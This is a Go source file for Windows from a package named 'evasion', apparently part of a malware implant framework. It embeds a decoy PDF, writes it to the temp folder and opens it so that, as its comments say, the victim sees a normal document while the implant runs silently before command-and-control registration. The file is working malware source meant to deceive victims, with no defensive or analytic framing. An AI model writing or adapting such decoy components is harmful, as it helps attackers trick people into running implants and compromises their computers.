//go:build windows

package evasion

import (
	_ "embed"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"
)

//go:embed decoy.pdf
var decoyPDF []byte

// DropAndOpenPDF writes the embedded decoy PDF to temp and opens it.
// The victim sees a normal PDF while the implant runs silently.
// Call this early in main(), before C2 registration.
func DropAndOpenPDF() {
	if len(decoyPDF) == 0 {
		return
	}

	tmpPath := filepath.Join(os.TempDir(), "decoy.pdf")
	if err := os.WriteFile(tmpPath, decoyPDF, 0644); err != nil {
		return
	}

	// ShellExecuteW: open the PDF with default handler silently
	shell32 := syscall.NewLazyDLL("shell32.dll")
	shellExecuteW := shell32.NewProc("ShellExecuteW")

	pathPtr, _ := syscall.UTF16PtrFromString(tmpPath)
	verbPtr, _ := syscall.UTF16PtrFromString("open")

	shellExecuteW.Call(
		0, // hwnd (NULL = no parent)
		uintptr(unsafe.Pointer(verbPtr)), // lpOperation
		uintptr(unsafe.Pointer(pathPtr)), // lpFile
		0, 0, // lpParameters, lpDirectory
		1, // nShowCmd = SW_SHOWNORMAL
	)
}
